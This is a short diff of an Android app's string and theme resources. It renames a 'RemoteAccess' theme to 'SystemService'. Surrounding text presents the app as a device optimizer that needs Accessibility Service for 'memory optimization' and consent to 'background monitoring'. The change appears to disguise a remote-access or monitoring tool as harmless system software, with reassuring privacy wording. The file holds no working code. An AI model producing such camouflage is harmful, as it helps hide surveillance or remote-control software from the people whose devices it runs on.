@@ -29,7 +29,7 @@
     <string name="status_inactive">Service requires setup to activate.</string>
     <string name="terms_content">SYSTEM SERVICE TERMS\n\n• This service monitors device performance\n• Background optimization will be enabled\n• You can deactivate at any time\n• Data is processed locally on your device\n• Your privacy is protected\n\nBy activating, you acknowledge that:\n• You own or have permission to use this device\n• You understand the service functionality\n• You consent to background monitoring\n\nFEATURES:\n• Memory optimization (requires Accessibility Service)\n• Background process management\n• Battery life optimization\n• Storage cleanup\n\nAll features require your explicit permission and are visible in Android settings.</string>
     <string name="terms_title">Terms &amp; Conditions</string>
-    <style name="Theme.RemoteAccess" parent="Theme.MaterialComponents.DayNight.DarkActionBar">
+    <style name="Theme.SystemService" parent="Theme.MaterialComponents.DayNight.DarkActionBar">
         <item name="colorPrimary">@color/colorPrimary</item>
         <item name="colorPrimaryVariant">@color/colorPrimaryDark</item>
         <item name="colorOnPrimary">#FFFFFF</item>
